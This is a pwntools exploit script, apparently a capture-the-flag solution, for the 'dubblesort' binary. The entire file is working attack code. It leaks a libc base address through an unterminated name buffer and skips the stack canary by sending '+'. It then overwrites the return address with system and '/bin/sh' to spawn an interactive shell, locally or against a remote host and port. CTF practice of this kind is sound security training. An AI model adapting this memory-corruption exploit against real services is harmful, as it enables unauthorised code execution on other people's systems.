#/usr/env/bin python
#-*- coding: utf-8 -*-
from pwn import *
import sys


def exploit():
    #Leaking libc
    io.recvuntil('What your name :')
    io.send('A'*0x1c)
    io.recvuntil('A'*0x1c)
    libc_base = u32(io.recv(4))-0x1ae244
    log.info('libc_base:'+hex(libc_base))

    libc.address = libc_base
    one_gadget = libc_base+0x3a819
    log.info("one_gadget:"+hex(one_gadget))
    system = libc.symbols['system']
    log.info('system:'+hex(system))
    binsh_addr = next(libc.search('/bin/sh'))
    log.info('binsh_addr:'+hex(binsh_addr))

    io.recvuntil('what to sort :')
    io.sendline(str(0x24))
    for i in range(0x18):
        io.recvuntil('number : ')
        io.sendline(str(1))
    #Bypass Canary
    io.recvuntil('number : ')
    io.sendline('+')
    #ret2libc
    for i in range(8):
        io.recvuntil('number : ')
        io.sendline(str(system))
    io.recvuntil('number : ')
    io.sendline(str(binsh_addr))
    io.recvuntil('number : ')
    io.sendline(str(binsh_addr))
    io.recvuntil('number : ')
    io.sendline(str(binsh_addr))

    io.interactive()

if __name__ == "__main__":
    context.binary = "./dubblesort"
    context.terminal = ['tmux','sp','-h']
    #context.log_level = 'debug'
    elf = ELF('./dubblesort')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc = ELF('./libc_32.so.6')
        exploit()
    else:
        io = process('./dubblesort',env={"LD_PRELOAD":"./libc.so.6"})
        libc = ELF('./libc_32.so.6')
        pause()
        exploit()
